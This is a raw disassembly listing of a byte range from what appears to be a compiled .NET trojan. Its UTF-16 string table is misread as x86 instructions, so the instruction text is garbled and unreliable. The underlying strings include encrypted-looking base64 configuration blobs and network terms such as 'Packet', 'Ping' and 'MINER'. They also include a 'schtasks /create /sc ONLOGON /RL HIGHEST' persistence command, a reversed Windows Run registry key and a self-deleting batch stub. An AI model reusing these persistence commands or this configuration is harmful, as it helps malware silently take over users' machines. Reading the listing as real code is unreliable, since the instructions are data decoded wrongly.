  40b8bd:	41                   	inc    %ecx
  40b8be:	00 77 00             	add    %dh,0x0(%edi)
  40b8c1:	37                   	aaa
  40b8c2:	00 59 00             	add    %bl,0x0(%ecx)
  40b8c5:	6d                   	insl   (%dx),%es:(%edi)
  40b8c6:	00 57 00             	add    %dl,0x0(%edi)
  40b8c9:	53                   	push   %ebx
  40b8ca:	00 35 00 39 00 68    	add    %dh,0x68003900
  40b8d0:	00 66 00             	add    %ah,0x0(%esi)
  40b8d3:	6d                   	insl   (%dx),%es:(%edi)
  40b8d4:	00 6e 00             	add    %ch,0x0(%esi)
  40b8d7:	41                   	inc    %ecx
  40b8d8:	00 55 00             	add    %dl,0x0(%ebp)
  40b8db:	72 00                	jb     0x40b8dd
  40b8dd:	45                   	inc    %ebp
  40b8de:	00 75 00             	add    %dh,0x0(%ebp)
  40b8e1:	2b 00                	sub    (%eax),%eax
  40b8e3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8e4:	00 73 00             	add    %dh,0x0(%ebx)
  40b8e7:	77 00                	ja     0x40b8e9
  40b8e9:	78 00                	js     0x40b8eb
  40b8eb:	45                   	inc    %ebp
  40b8ec:	00 72 00             	add    %dh,0x0(%edx)
  40b8ef:	59                   	pop    %ecx
  40b8f0:	00 67 00             	add    %ah,0x0(%edi)
  40b8f3:	5a                   	pop    %edx
  40b8f4:	00 50 00             	add    %dl,0x0(%eax)
  40b8f7:	71 00                	jno    0x40b8f9
  40b8f9:	63 00                	arpl   %eax,(%eax)
  40b8fb:	75 00                	jne    0x40b8fd
  40b8fd:	59                   	pop    %ecx
  40b8fe:	00 45 00             	add    %al,0x0(%ebp)
  40b901:	79 00                	jns    0x40b903
  40b903:	45                   	inc    %ebp
  40b904:	00 57 00             	add    %dl,0x0(%edi)
  40b907:	59                   	pop    %ecx
  40b908:	00 5a 00             	add    %bl,0x0(%edx)
  40b90b:	41                   	inc    %ecx
  40b90c:	00 66 00             	add    %ah,0x0(%esi)
  40b90f:	78 00                	js     0x40b911
  40b911:	44                   	inc    %esp
  40b912:	00 45 00             	add    %al,0x0(%ebp)
  40b915:	32 00                	xor    (%eax),%al
  40b917:	72 00                	jb     0x40b919
  40b919:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40b91d:	79 00                	jns    0x40b91f
  40b91f:	52                   	push   %edx
  40b920:	00 70 00             	add    %dh,0x0(%eax)
  40b923:	42                   	inc    %edx
  40b924:	00 79 00             	add    %bh,0x0(%ecx)
  40b927:	79 00                	jns    0x40b929
  40b929:	38 00                	cmp    %al,(%eax)
  40b92b:	46                   	inc    %esi
  40b92c:	00 75 00             	add    %dh,0x0(%ebp)
  40b92f:	77 00                	ja     0x40b931
  40b931:	6f                   	outsl  %ds:(%esi),(%dx)
  40b932:	00 65 00             	add    %ah,0x0(%ebp)
  40b935:	4c                   	dec    %esp
  40b936:	00 47 00             	add    %al,0x0(%edi)
  40b939:	43                   	inc    %ebx
  40b93a:	00 55 00             	add    %dl,0x0(%ebp)
  40b93d:	4e                   	dec    %esi
  40b93e:	00 6a 00             	add    %ch,0x0(%edx)
  40b941:	54                   	push   %esp
  40b942:	00 58 00             	add    %bl,0x0(%eax)
  40b945:	4e                   	dec    %esi
  40b946:	00 75 00             	add    %dh,0x0(%ebp)
  40b949:	53                   	push   %ebx
  40b94a:	00 47 00             	add    %al,0x0(%edi)
  40b94d:	30 00                	xor    %al,(%eax)
  40b94f:	4d                   	dec    %ebp
  40b950:	00 47 00             	add    %al,0x0(%edi)
  40b953:	5a                   	pop    %edx
  40b954:	00 2b                	add    %ch,(%ebx)
  40b956:	00 36                	add    %dh,(%esi)
  40b958:	00 50 00             	add    %dl,0x0(%eax)
  40b95b:	78 00                	js     0x40b95d
  40b95d:	75 00                	jne    0x40b95f
  40b95f:	4c                   	dec    %esp
  40b960:	00 53 00             	add    %dl,0x0(%ebx)
  40b963:	49                   	dec    %ecx
  40b964:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  40b968:	00 72 00             	add    %dh,0x0(%edx)
  40b96b:	71 00                	jno    0x40b96d
  40b96d:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40b971:	50                   	push   %eax
  40b972:	00 4e 00             	add    %cl,0x0(%esi)
  40b975:	71 00                	jno    0x40b977
  40b977:	6a 00                	push   $0x0
  40b979:	4d                   	dec    %ebp
  40b97a:	00 51 00             	add    %dl,0x0(%ecx)
  40b97d:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  40b981:	45                   	inc    %ebp
  40b982:	00 51 00             	add    %dl,0x0(%ecx)
  40b985:	30 00                	xor    %al,(%eax)
  40b987:	72 00                	jb     0x40b989
  40b989:	35 00 55 00 51       	xor    $0x51005500,%eax
  40b98e:	00 36                	add    %dh,(%esi)
  40b990:	00 36                	add    %dh,(%esi)
  40b992:	00 52 00             	add    %dl,0x0(%edx)
  40b995:	38 00                	cmp    %al,(%eax)
  40b997:	33 00                	xor    (%eax),%eax
  40b999:	44                   	inc    %esp
  40b99a:	00 65 00             	add    %ah,0x0(%ebp)
  40b99d:	6d                   	insl   (%dx),%es:(%edi)
  40b99e:	00 74 00 7a          	add    %dh,0x7a(%eax,%eax,1)
  40b9a2:	00 4e 00             	add    %cl,0x0(%esi)
  40b9a5:	55                   	push   %ebp
  40b9a6:	00 46 00             	add    %al,0x0(%esi)
  40b9a9:	70 00                	jo     0x40b9ab
  40b9ab:	63 00                	arpl   %eax,(%eax)
  40b9ad:	4a                   	dec    %edx
  40b9ae:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  40b9b2:	00 32                	add    %dh,(%edx)
  40b9b4:	00 78 00             	add    %bh,0x0(%eax)
  40b9b7:	75 00                	jne    0x40b9b9
  40b9b9:	5a                   	pop    %edx
  40b9ba:	00 69 00             	add    %ch,0x0(%ecx)
  40b9bd:	38 00                	cmp    %al,(%eax)
  40b9bf:	49                   	dec    %ecx
  40b9c0:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  40b9c4:	00 58 00             	add    %bl,0x0(%eax)
  40b9c7:	4b                   	dec    %ebx
  40b9c8:	00 33                	add    %dh,(%ebx)
  40b9ca:	00 39                	add    %bh,(%ecx)
  40b9cc:	00 70 00             	add    %dh,0x0(%eax)
  40b9cf:	57                   	push   %edi
  40b9d0:	00 39                	add    %bh,(%ecx)
  40b9d2:	00 4c 00 6d          	add    %cl,0x6d(%eax,%eax,1)
  40b9d6:	00 7a 00             	add    %bh,0x0(%edx)
  40b9d9:	41                   	inc    %ecx
  40b9da:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b9e0:	80 b1 51 00 6c 00 32 	xorb   $0x32,0x6c0051(%ecx)
  40b9e7:	00 32                	add    %dh,(%edx)
  40b9e9:	00 75 00             	add    %dh,0x0(%ebp)
  40b9ec:	6d                   	insl   (%dx),%es:(%edi)
  40b9ed:	00 42 00             	add    %al,0x0(%edx)
  40b9f0:	51                   	push   %ecx
  40b9f1:	00 4a 00             	add    %cl,0x0(%edx)
  40b9f4:	31 00                	xor    %eax,(%eax)
  40b9f6:	53                   	push   %ebx
  40b9f7:	00 56 00             	add    %dl,0x0(%esi)
  40b9fa:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9fb:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  40b9ff:	00 4a 00             	add    %cl,0x0(%edx)
  40ba02:	35 00 55 00 4a       	xor    $0x4a005500,%eax
  40ba07:	00 6f 00             	add    %ch,0x0(%edi)
  40ba0a:	6d                   	insl   (%dx),%es:(%edi)
  40ba0b:	00 31                	add    %dh,(%ecx)
  40ba0d:	00 39                	add    %bh,(%ecx)
  40ba0f:	00 31                	add    %dh,(%ecx)
  40ba11:	00 36                	add    %dh,(%esi)
  40ba13:	00 4b 00             	add    %cl,0x0(%ebx)
  40ba16:	48                   	dec    %eax
  40ba17:	00 47 00             	add    %al,0x0(%edi)
  40ba1a:	34 00                	xor    $0x0,%al
  40ba1c:	39 00                	cmp    %eax,(%eax)
  40ba1e:	30 00                	xor    %al,(%eax)
  40ba20:	54                   	push   %esp
  40ba21:	00 53 00             	add    %dl,0x0(%ebx)
  40ba24:	30 00                	xor    %al,(%eax)
  40ba26:	77 00                	ja     0x40ba28
  40ba28:	35 00 6e 00 45       	xor    $0x45006e00,%eax
  40ba2d:	00 53 00             	add    %dl,0x0(%ebx)
  40ba30:	55                   	push   %ebp
  40ba31:	00 7a 00             	add    %bh,0x0(%edx)
  40ba34:	66 00 33             	data16 add %dh,(%ebx)
  40ba37:	00 4c 00 48          	add    %cl,0x48(%eax,%eax,1)
  40ba3b:	00 4e 00             	add    %cl,0x0(%esi)
  40ba3e:	42                   	inc    %edx
  40ba3f:	00 6d 00             	add    %ch,0x0(%ebp)
  40ba42:	61                   	popa
  40ba43:	00 56 00             	add    %dl,0x0(%esi)
  40ba46:	30 00                	xor    %al,(%eax)
  40ba48:	66 00 50 00          	data16 add %dl,0x0(%eax)
  40ba4c:	39 00                	cmp    %eax,(%eax)
  40ba4e:	52                   	push   %edx
  40ba4f:	00 56 00             	add    %dl,0x0(%esi)
  40ba52:	50                   	push   %eax
  40ba53:	00 5a 00             	add    %bl,0x0(%edx)
  40ba56:	53                   	push   %ebx
  40ba57:	00 57 00             	add    %dl,0x0(%edi)
  40ba5a:	45                   	inc    %ebp
  40ba5b:	00 62 00             	add    %ah,0x0(%edx)
  40ba5e:	4d                   	dec    %ebp
  40ba5f:	00 6f 00             	add    %ch,0x0(%edi)
  40ba62:	66 00 37             	data16 add %dh,(%edi)
  40ba65:	00 67 00             	add    %ah,0x0(%edi)
  40ba68:	56                   	push   %esi
  40ba69:	00 45 00             	add    %al,0x0(%ebp)
  40ba6c:	4b                   	dec    %ebx
  40ba6d:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  40ba71:	00 79 00             	add    %bh,0x0(%ecx)
  40ba74:	54                   	push   %esp
  40ba75:	00 50 00             	add    %dl,0x0(%eax)
  40ba78:	49                   	dec    %ecx
  40ba79:	00 72 00             	add    %dh,0x0(%edx)
  40ba7c:	6b 00 65             	imul   $0x65,(%eax),%eax
  40ba7f:	00 58 00             	add    %bl,0x0(%eax)
  40ba82:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba83:	00 46 00             	add    %al,0x0(%esi)
  40ba86:	37                   	aaa
  40ba87:	00 6a 00             	add    %ch,0x0(%edx)
  40ba8a:	38 00                	cmp    %al,(%eax)
  40ba8c:	67 00 3d             	add    %bh,(%di)
  40ba8f:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40ba95:	56                   	push   %esi
  40ba96:	00 4e 00             	add    %cl,0x0(%esi)
  40ba99:	61                   	popa
  40ba9a:	00 5a 00             	add    %bl,0x0(%edx)
  40ba9d:	48                   	dec    %eax
  40ba9e:	00 48 00             	add    %cl,0x0(%eax)
  40baa1:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40baa5:	4c                   	dec    %esp
  40baa6:	00 51 00             	add    %dl,0x0(%ecx)
  40baa9:	54                   	push   %esp
  40baaa:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  40baae:	00 63 00             	add    %ah,0x0(%ebx)
  40bab1:	2b 00                	sub    (%eax),%eax
  40bab3:	68 00 49 00 49       	push   $0x49004900
  40bab8:	00 4c 00 71          	add    %cl,0x71(%eax,%eax,1)
  40babc:	00 61 00             	add    %ah,0x0(%ecx)
  40babf:	74 00                	je     0x40bac1
  40bac1:	6f                   	outsl  %ds:(%esi),(%dx)
  40bac2:	00 33                	add    %dh,(%ebx)
  40bac4:	00 55 00             	add    %dl,0x0(%ebp)
  40bac7:	41                   	inc    %ecx
  40bac8:	00 48 00             	add    %cl,0x0(%eax)
  40bacb:	41                   	inc    %ecx
  40bacc:	00 37                	add    %dh,(%edi)
  40bace:	00 4d 00             	add    %cl,0x0(%ebp)
  40bad1:	59                   	pop    %ecx
  40bad2:	00 71 00             	add    %dh,0x0(%ecx)
  40bad5:	79 00                	jns    0x40bad7
  40bad7:	32 00                	xor    (%eax),%al
  40bad9:	72 00                	jb     0x40badb
  40badb:	36 00 38             	add    %bh,%ss:(%eax)
  40bade:	00 71 00             	add    %dh,0x0(%ecx)
  40bae1:	57                   	push   %edi
  40bae2:	00 37                	add    %dh,(%edi)
  40bae4:	00 69 00             	add    %ch,0x0(%ecx)
  40bae7:	46                   	inc    %esi
  40bae8:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40baec:	00 46 00             	add    %al,0x0(%esi)
  40baef:	30 00                	xor    %al,(%eax)
  40baf1:	50                   	push   %eax
  40baf2:	00 36                	add    %dh,(%esi)
  40baf4:	00 34 00             	add    %dh,(%eax,%eax,1)
  40baf7:	6b 00 52             	imul   $0x52,(%eax),%eax
  40bafa:	00 31                	add    %dh,(%ecx)
  40bafc:	00 6d 00             	add    %ch,0x0(%ebp)
  40baff:	5a                   	pop    %edx
  40bb00:	00 58 00             	add    %bl,0x0(%eax)
  40bb03:	47                   	inc    %edi
  40bb04:	00 37                	add    %dh,(%edi)
  40bb06:	00 2b                	add    %ch,(%ebx)
  40bb08:	00 61 00             	add    %ah,0x0(%ecx)
  40bb0b:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb0c:	00 45 00             	add    %al,0x0(%ebp)
  40bb0f:	4a                   	dec    %edx
  40bb10:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  40bb14:	00 2f                	add    %ch,(%edi)
  40bb16:	00 36                	add    %dh,(%esi)
  40bb18:	00 53 00             	add    %dl,0x0(%ebx)
  40bb1b:	50                   	push   %eax
  40bb1c:	00 65 00             	add    %ah,0x0(%ebp)
  40bb1f:	6c                   	insb   (%dx),%es:(%edi)
  40bb20:	00 4d 00             	add    %cl,0x0(%ebp)
  40bb23:	46                   	inc    %esi
  40bb24:	00 41 00             	add    %al,0x0(%ecx)
  40bb27:	77 00                	ja     0x40bb29
  40bb29:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40bb2d:	4a                   	dec    %edx
  40bb2e:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  40bb32:	00 53 00             	add    %dl,0x0(%ebx)
  40bb35:	54                   	push   %esp
  40bb36:	00 47 00             	add    %al,0x0(%edi)
  40bb39:	58                   	pop    %eax
  40bb3a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bb3d:	48                   	dec    %eax
  40bb3e:	00 51 00             	add    %dl,0x0(%ecx)
  40bb41:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bb46:	80 b1 53 00 41 00 37 	xorb   $0x37,0x410053(%ecx)
  40bb4d:	00 65 00             	add    %ah,0x0(%ebp)
  40bb50:	4f                   	dec    %edi
  40bb51:	00 2f                	add    %ch,(%edi)
  40bb53:	00 65 00             	add    %ah,0x0(%ebp)
  40bb56:	58                   	pop    %eax
  40bb57:	00 75 00             	add    %dh,0x0(%ebp)
  40bb5a:	76 00                	jbe    0x40bb5c
  40bb5c:	76 00                	jbe    0x40bb5e
  40bb5e:	49                   	dec    %ecx
  40bb5f:	00 31                	add    %dh,(%ecx)
  40bb61:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40bb65:	00 59 00             	add    %bl,0x0(%ecx)
  40bb68:	79 00                	jns    0x40bb6a
  40bb6a:	30 00                	xor    %al,(%eax)
  40bb6c:	39 00                	cmp    %eax,(%eax)
  40bb6e:	7a 00                	jp     0x40bb70
  40bb70:	51                   	push   %ecx
  40bb71:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bb74:	61                   	popa
  40bb75:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40bb79:	00 7a 00             	add    %bh,0x0(%edx)
  40bb7c:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb7d:	00 47 00             	add    %al,0x0(%edi)
  40bb80:	77 00                	ja     0x40bb82
  40bb82:	48                   	dec    %eax
  40bb83:	00 73 00             	add    %dh,0x0(%ebx)
  40bb86:	41                   	inc    %ecx
  40bb87:	00 63 00             	add    %ah,0x0(%ebx)
  40bb8a:	61                   	popa
  40bb8b:	00 76 00             	add    %dh,0x0(%esi)
  40bb8e:	70 00                	jo     0x40bb90
  40bb90:	6d                   	insl   (%dx),%es:(%edi)
  40bb91:	00 45 00             	add    %al,0x0(%ebp)
  40bb94:	73 00                	jae    0x40bb96
  40bb96:	41                   	inc    %ecx
  40bb97:	00 37                	add    %dh,(%edi)
  40bb99:	00 35 00 75 00 4b    	add    %dh,0x4b007500
  40bb9f:	00 4e 00             	add    %cl,0x0(%esi)
  40bba2:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40bba6:	79 00                	jns    0x40bba8
  40bba8:	46                   	inc    %esi
  40bba9:	00 63 00             	add    %ah,0x0(%ebx)
  40bbac:	75 00                	jne    0x40bbae
  40bbae:	4c                   	dec    %esp
  40bbaf:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
  40bbb3:	00 56 00             	add    %dl,0x0(%esi)
  40bbb6:	30 00                	xor    %al,(%eax)
  40bbb8:	4c                   	dec    %esp
  40bbb9:	00 61 00             	add    %ah,0x0(%ecx)
  40bbbc:	70 00                	jo     0x40bbbe
  40bbbe:	4b                   	dec    %ebx
  40bbbf:	00 6e 00             	add    %ch,0x0(%esi)
  40bbc2:	65 00 54 00 74       	add    %dl,%gs:0x74(%eax,%eax,1)
  40bbc7:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  40bbcb:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40bbcf:	00 56 00             	add    %dl,0x0(%esi)
  40bbd2:	66 00 47 00          	data16 add %al,0x0(%edi)
  40bbd6:	78 00                	js     0x40bbd8
  40bbd8:	2f                   	das
  40bbd9:	00 6e 00             	add    %ch,0x0(%esi)
  40bbdc:	4c                   	dec    %esp
  40bbdd:	00 58 00             	add    %bl,0x0(%eax)
  40bbe0:	30 00                	xor    %al,(%eax)
  40bbe2:	4c                   	dec    %esp
  40bbe3:	00 62 00             	add    %ah,0x0(%edx)
  40bbe6:	31 00                	xor    %eax,(%eax)
  40bbe8:	35 00 56 00 36       	xor    $0x36005600,%eax
  40bbed:	00 30                	add    %dh,(%eax)
  40bbef:	00 6e 00             	add    %ch,0x0(%esi)
  40bbf2:	41                   	inc    %ecx
  40bbf3:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40bbf9:	01 00                	add    %eax,(%eax)
  40bbfb:	03 35 00 00 09 6e    	add    0x6e090000,%esi
  40bc01:	00 75 00             	add    %dh,0x0(%ebp)
  40bc04:	6c                   	insb   (%dx),%es:(%edi)
  40bc05:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40bc09:	03 3a                	add    (%edx),%edi
  40bc0b:	00 00                	add    %al,(%eax)
  40bc0d:	0d 50 00 61 00       	or     $0x610050,%eax
  40bc12:	63 00                	arpl   %eax,(%eax)
  40bc14:	6b 00 65             	imul   $0x65,(%eax),%eax
  40bc17:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40bc1b:	09 50 00             	or     %edx,0x0(%eax)
  40bc1e:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40bc24:	00 0f                	add    %cl,(%edi)
  40bc26:	4d                   	dec    %ebp
  40bc27:	00 65 00             	add    %ah,0x0(%ebp)
  40bc2a:	73 00                	jae    0x40bc2c
  40bc2c:	73 00                	jae    0x40bc2e
  40bc2e:	61                   	popa
  40bc2f:	00 67 00             	add    %ah,0x0(%edi)
  40bc32:	65 00 00             	add    %al,%gs:(%eax)
  40bc35:	0d 4d 00 49 00       	or     $0x49004d,%eax
  40bc3a:	4e                   	dec    %esi
  40bc3b:	00 45 00             	add    %al,0x0(%ebp)
  40bc3e:	52                   	push   %edx
  40bc3f:	00 20                	add    %ah,(%eax)
  40bc41:	00 00                	add    %al,(%eax)
  40bc43:	03 30                	add    (%eax),%esi
  40bc45:	00 00                	add    %al,(%eax)
  40bc47:	0f 7b                	(bad)
  40bc49:	00 30                	add    %dh,(%eax)
  40bc4b:	00 3a                	add    %bh,(%edx)
  40bc4d:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40bc51:	00 7d 00             	add    %bh,0x0(%ebp)
  40bc54:	20 00                	and    %al,(%eax)
  40bc56:	00 0f                	add    %cl,(%edi)
  40bc58:	7b 00                	jnp    0x40bc5a
  40bc5a:	30 00                	xor    %al,(%eax)
  40bc5c:	3a 00                	cmp    (%eax),%al
  40bc5e:	58                   	pop    %eax
  40bc5f:	00 32                	add    %dh,(%edx)
  40bc61:	00 7d 00             	add    %bh,0x0(%ebp)
  40bc64:	20 00                	and    %al,(%eax)
  40bc66:	00 2b                	add    %ch,(%ebx)
  40bc68:	28 00                	sub    %al,(%eax)
  40bc6a:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc6b:	00 65 00             	add    %ah,0x0(%ebp)
  40bc6e:	76 00                	jbe    0x40bc70
  40bc70:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc74:	20 00                	and    %al,(%eax)
  40bc76:	75 00                	jne    0x40bc78
  40bc78:	73 00                	jae    0x40bc7a
  40bc7a:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bc7f:	00 20                	add    %ah,(%eax)
  40bc81:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bc85:	00 70 00             	add    %dh,0x0(%eax)
  40bc88:	65 00 20             	add    %ah,%gs:(%eax)
  40bc8b:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bc8e:	63 00                	arpl   %eax,(%eax)
  40bc90:	31 00                	xor    %eax,(%eax)
  40bc92:	00 45 28             	add    %al,0x28(%ebp)
  40bc95:	00 65 00             	add    %ah,0x0(%ebp)
  40bc98:	78 00                	js     0x40bc9a
  40bc9a:	74 00                	je     0x40bc9c
  40bc9c:	38 00                	cmp    %al,(%eax)
  40bc9e:	2c 00                	sub    $0x0,%al
  40bca0:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bca4:	74 00                	je     0x40bca6
  40bca6:	31 00                	xor    %eax,(%eax)
  40bca8:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bcac:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bcb0:	33 00                	xor    (%eax),%eax
  40bcb2:	32 00                	xor    (%eax),%al
  40bcb4:	29 00                	sub    %eax,(%eax)
  40bcb6:	20 00                	and    %al,(%eax)
  40bcb8:	74 00                	je     0x40bcba
  40bcba:	79 00                	jns    0x40bcbc
  40bcbc:	70 00                	jo     0x40bcbe
  40bcbe:	65 00 20             	add    %ah,%gs:(%eax)
  40bcc1:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bcc4:	63 00                	arpl   %eax,(%eax)
  40bcc6:	37                   	aaa
  40bcc7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bcca:	24 00                	and    $0x0,%al
  40bccc:	63 00                	arpl   %eax,(%eax)
  40bcce:	38 00                	cmp    %al,(%eax)
  40bcd0:	2c 00                	sub    $0x0,%al
  40bcd2:	24 00                	and    $0x0,%al
  40bcd4:	63 00                	arpl   %eax,(%eax)
  40bcd6:	39 00                	cmp    %eax,(%eax)
  40bcd8:	00 19                	add    %bl,(%ecx)
  40bcda:	73 00                	jae    0x40bcdc
  40bcdc:	63 00                	arpl   %eax,(%eax)
  40bcde:	68 00 74 00 61       	push   $0x61007400
  40bce3:	00 73 00             	add    %dh,0x0(%ebx)
  40bce6:	6b 00 73             	imul   $0x73,(%eax),%eax
  40bce9:	00 2e                	add    %ch,(%esi)
  40bceb:	00 65 00             	add    %ah,0x0(%ebp)
  40bcee:	78 00                	js     0x40bcf0
  40bcf0:	65 00 00             	add    %al,%gs:(%eax)
  40bcf3:	53                   	push   %ebx
  40bcf4:	2f                   	das
  40bcf5:	00 63 00             	add    %ah,0x0(%ebx)
  40bcf8:	72 00                	jb     0x40bcfa
  40bcfa:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40bcfe:	74 00                	je     0x40bd00
  40bd00:	65 00 20             	add    %ah,%gs:(%eax)
  40bd03:	00 2f                	add    %ch,(%edi)
  40bd05:	00 66 00             	add    %ah,0x0(%esi)
  40bd08:	20 00                	and    %al,(%eax)
  40bd0a:	2f                   	das
  40bd0b:	00 73 00             	add    %dh,0x0(%ebx)
  40bd0e:	63 00                	arpl   %eax,(%eax)
  40bd10:	20 00                	and    %al,(%eax)
  40bd12:	4f                   	dec    %edi
  40bd13:	00 4e 00             	add    %cl,0x0(%esi)
  40bd16:	4c                   	dec    %esp
  40bd17:	00 4f 00             	add    %cl,0x0(%edi)
  40bd1a:	47                   	inc    %edi
  40bd1b:	00 4f 00             	add    %cl,0x0(%edi)
  40bd1e:	4e                   	dec    %esi
  40bd1f:	00 20                	add    %ah,(%eax)
  40bd21:	00 2f                	add    %ch,(%edi)
  40bd23:	00 52 00             	add    %dl,0x0(%edx)
  40bd26:	4c                   	dec    %esp
  40bd27:	00 20                	add    %ah,(%eax)
  40bd29:	00 48 00             	add    %cl,0x0(%eax)
  40bd2c:	49                   	dec    %ecx
  40bd2d:	00 47 00             	add    %al,0x0(%edi)
  40bd30:	48                   	dec    %eax
  40bd31:	00 45 00             	add    %al,0x0(%ebp)
  40bd34:	53                   	push   %ebx
  40bd35:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40bd39:	00 2f                	add    %ch,(%edi)
  40bd3b:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40bd3f:	00 20                	add    %ah,(%eax)
  40bd41:	00 22                	add    %ah,(%edx)
  40bd43:	00 27                	add    %ah,(%edi)
  40bd45:	00 01                	add    %al,(%ecx)
  40bd47:	13 22                	adc    (%edx),%esp
  40bd49:	00 27                	add    %ah,(%edi)
  40bd4b:	00 20                	add    %ah,(%eax)
  40bd4d:	00 2f                	add    %ch,(%edi)
  40bd4f:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40bd53:	00 20                	add    %ah,(%eax)
  40bd55:	00 22                	add    %ah,(%edx)
  40bd57:	00 27                	add    %ah,(%edi)
  40bd59:	00 01                	add    %al,(%ecx)
  40bd5b:	05 22 00 27 00       	add    $0x270022,%eax
  40bd60:	01 5d 5c             	add    %ebx,0x5c(%ebp)
  40bd63:	00 6e 00             	add    %ch,0x0(%esi)
  40bd66:	75 00                	jne    0x40bd68
  40bd68:	52                   	push   %edx
  40bd69:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40bd6d:	00 6f 00             	add    %ch,0x0(%edi)
  40bd70:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40bd76:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40bd7a:	74 00                	je     0x40bd7c
  40bd7c:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd7d:	00 65 00             	add    %ah,0x0(%ebp)
  40bd80:	72 00                	jb     0x40bd82
  40bd82:	72 00                	jb     0x40bd84
  40bd84:	75 00                	jne    0x40bd86
  40bd86:	43                   	inc    %ebx
  40bd87:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40bd8b:	00 77 00             	add    %dh,0x0(%edi)
  40bd8e:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd8f:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40bd93:	00 69 00             	add    %ch,0x0(%ecx)
  40bd96:	57                   	push   %edi
  40bd97:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40bd9b:	00 66 00             	add    %ah,0x0(%esi)
  40bd9e:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd9f:	00 73 00             	add    %dh,0x0(%ebx)
  40bda2:	6f                   	outsl  %ds:(%esi),(%dx)
  40bda3:	00 72 00             	add    %dh,0x0(%edx)
  40bda6:	63 00                	arpl   %eax,(%eax)
  40bda8:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40bdae:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bdb2:	61                   	popa
  40bdb3:	00 77 00             	add    %dh,0x0(%edi)
  40bdb6:	74 00                	je     0x40bdb8
  40bdb8:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bdbc:	53                   	push   %ebx
  40bdbd:	00 00                	add    %al,(%eax)
  40bdbf:	03 22                	add    (%edx),%esp
  40bdc1:	00 00                	add    %al,(%eax)
  40bdc3:	09 2e                	or     %ebp,(%esi)
  40bdc5:	00 62 00             	add    %ah,0x0(%edx)
  40bdc8:	61                   	popa
  40bdc9:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40bdcd:	13 40 00             	adc    0x0(%eax),%eax
  40bdd0:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bdd4:	68 00 6f 00 20       	push   $0x20006f00
  40bdd9:	00 6f 00             	add    %ch,0x0(%edi)
  40bddc:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40bde0:	00 1f                	add    %bl,(%edi)
  40bde2:	74 00                	je     0x40bde4
  40bde4:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40bdea:	6f                   	outsl  %ds:(%esi),(%dx)
  40bdeb:	00 75 00             	add    %dh,0x0(%ebp)
  40bdee:	74 00                	je     0x40bdf0
  40bdf0:	20 00                	and    %al,(%eax)
  40bdf2:	33 00                	xor    (%eax),%eax
  40bdf4:	20 00                	and    %al,(%eax)
  40bdf6:	3e 00 20             	add    %ah,%ds:(%eax)
  40bdf9:	00 4e 00             	add    %cl,0x0(%esi)
  40bdfc:	55                   	push   %ebp
  40bdfd:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40be01:	15 53 00 54 00       	adc    $0x540053,%eax
  40be06:	41                   	inc    %ecx
